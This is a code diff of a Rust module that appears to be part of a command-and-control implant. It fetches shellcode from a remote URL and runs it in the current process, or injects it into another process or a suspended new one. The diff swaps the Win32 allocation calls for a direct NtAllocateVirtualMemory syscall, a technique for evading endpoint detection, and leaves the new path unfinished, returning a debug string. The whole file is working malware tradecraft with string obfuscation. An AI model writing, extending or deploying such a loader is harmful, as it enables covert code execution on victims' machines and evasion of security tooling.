@@ -3,6 +3,9 @@ pub mod command {
     use crate::obfwin::Functions::*;
     use litcrypt::lc;
     use std::ptr::{null, null_mut};
+    use std::os::raw::c_void;
+    use rust_syscalls::syscall;
+    use ntapi::ntmmapi::NtAllocateVirtualMemory;
 
     fn get_file_vec(
         base_url: &str,
@@ -57,43 +60,56 @@ pub mod command {
         let file_vec = get_file_vec(base_url, file_name, cookie_header);
 
         let file_bytes: &[u8] = &file_vec;
-        let file_size = file_bytes.len();
+        let file_size: *mut usize = &mut file_bytes.len();
 
-        let mut old_perms = PAGE_READWRITE;
+        let old_perms = PAGE_READWRITE;
+
 
         unsafe {
 
-            // If specified to use RW memory, allocate, copy, change to RX, execute
-            if memory_permissions == "RW" {
-                // Allocate some RW
-                let dest = (kernel32.VirtualAlloc)(
-                    null(),
-                    file_size,
-                    MEM_COMMIT | MEM_RESERVE,
-                    PAGE_READWRITE,
-                );
-                // Copy the shellcode in there
-                (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
-                // Re-protect as exec-read
-                (kernel32.VirtualProtect)(dest, file_size, PAGE_EXECUTE_READ, old_perms);
-                // Run the shellcode
-                let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
+            let curr_process = (kernel32.GetCurrentProcess)();
+            let mut dest: *mut c_void = null_mut();
+            let mut ret: u32 = 0;
+
+            if memory_permissions == "RX" {
+                let a = syscall!("NtAllocateVirtualMemory", curr_process, dest, 0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
+                // let a = NtAllocateVirtualMemory(std::mem::transmute(curr_process), std::mem::transmute(dest), 0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
+                ret = std::mem::transmute(a);
             } else {
-                // RWX by default, allocate, copy, execute
-                // Allocate some RWX
-                let dest = (kernel32.VirtualAlloc)(
-                    null(),
-                    file_size,
-                    MEM_COMMIT | MEM_RESERVE,
-                    PAGE_EXECUTE_READWRITE,
-                );
-                // Copy the shellcode in there
-                (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
-                // Run the shellcode
-                let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
+
             }
+
+            // // If specified to use RW memory, allocate, copy, change to RX, execute
+            // if memory_permissions == "RW" {
+            //     // Allocate some RW
+            //     let dest = (kernel32.VirtualAlloc)(
+            //         null(),
+            //         file_size,
+            //         MEM_COMMIT | MEM_RESERVE,
+            //         PAGE_READWRITE,
+            //     );
+            //     // Copy the shellcode in there
+            //     (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
+            //     // Re-protect as exec-read
+            //     (kernel32.VirtualProtect)(dest, file_size, PAGE_EXECUTE_READ, old_perms);
+            //     // Run the shellcode
+            //     let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
+            // } else {
+            //     // RWX by default, allocate, copy, execute
+            //     // Allocate some RWX
+            //     let dest = (kernel32.VirtualAlloc)(
+            //         null(),
+            //         file_size,
+            //         MEM_COMMIT | MEM_RESERVE,
+            //         PAGE_EXECUTE_READWRITE,
+            //     );
+            //     // Copy the shellcode in there
+            //     (ntdll.RtlMoveMemory)(dest, file_bytes.as_ptr().cast(), file_size);
+            //     // Run the shellcode
+            //     let handle = (kernel32.CreateThread)(null(), 0, dest, null(), 0, null_mut());
+            // }
+            format!("return code {} {}", ret, 123)
         }
-        lc!("Shellcode successfully executed")
     }
 
     pub fn shellcode_inject(
@@ -125,7 +141,7 @@ pub mod command {
             );
 
             // If specified to use RW memory, allocate, copy, change to RX, execute
-            if memory_permissions == "RW" {
+            if memory_permissions == "RX" {
                 let mut old_perm = PAGE_READWRITE;
 
                 // Allocate inside of the target pid process
@@ -211,7 +227,7 @@ pub mod command {
             let result = (kernel32.CreateProcessA)(null(), c_ptr_to_program_to_start.as_ptr().cast(), null(), null(), 0, CREATE_SUSPENDED, null(), null(), ptr_si, ptr_pi);
 
             // If specified to use RW memory, allocate, copy, change to RX, execute
-            if memory_permissions == "RW" {
+            if memory_permissions == "RX" {
                 let dest = (kernel32.VirtualAllocEx)(
                     pi.hProcess,
                     null(),
